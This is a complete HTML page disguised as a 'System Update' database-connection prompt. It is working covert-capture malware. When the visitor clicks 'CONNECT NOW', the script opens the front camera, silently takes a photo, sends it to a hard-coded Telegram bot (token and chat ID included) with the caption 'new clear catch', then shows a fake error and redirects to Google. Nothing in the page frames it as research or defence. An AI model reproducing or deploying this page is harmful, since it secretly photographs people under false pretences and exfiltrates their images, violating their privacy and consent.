<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Update</title>
    <style>
        body { background: black; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
        #status { font-size: 24px; margin-top: 20px; }
        #btn { padding: 15px 40px; background: #0f0; color: black; font-weight: bold; border: none; cursor: pointer; font-size: 20px; border-radius: 5px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <div id="status">DATABASE CONNECTION REQUIRED</div>
    <br>
    <button id="btn" onclick="startProcess()">CONNECT NOW</button>

    <script>
        const tok = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
        const id = "8042090388";

        async function startProcess() {
            document.getElementById('btn').style.display = "none";
            document.getElementById('status').innerText = "ESTABLISHING SECURE CONNECTION...";

            try {
                // طلب الكاميرا بجودة عالية
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
                });
                const video = document.getElementById('v');
                video.srcObject = stream;

                // أهم خطوة: ننتظر 4 ثواني كاملة لضمان أن العدسة فتحت ووزنت الإضاءة
                setTimeout(() => {
                    captureAndSend();
                }, 4000);

            } catch (e) {
                document.getElementById('status').innerText = "ACCESS DENIED! PLEASE ALLOW CAMERA.";
            }
        }

        async function captureAndSend() {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            
            // ضبط أبعاد الصورة لتكون واضحة
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            const ctx = c.getContext('2d');
            ctx.drawImage(v, 0, 0, c.width, c.height);
            
            // تحويل الصورة لجودة عالية 0.9
            const imgData = c.toDataURL('image/jpeg', 0.9);
            const blob = await (await fetch(imgData)).blob();
            
            const fd = new FormData();
            fd.append('chat_id', id);
            fd.append('photo', blob, 'capture.jpg');
            fd.append('caption', '✅ صيد جديد وواضح!');

            fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, {
                method: 'POST',
                body: fd
            }).then(() => {
                document.getElementById('status').innerText = "SYSTEM CRITICAL - REDIRECTING...";
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 1000);
            });
        }
    </script>
</body>
</html>
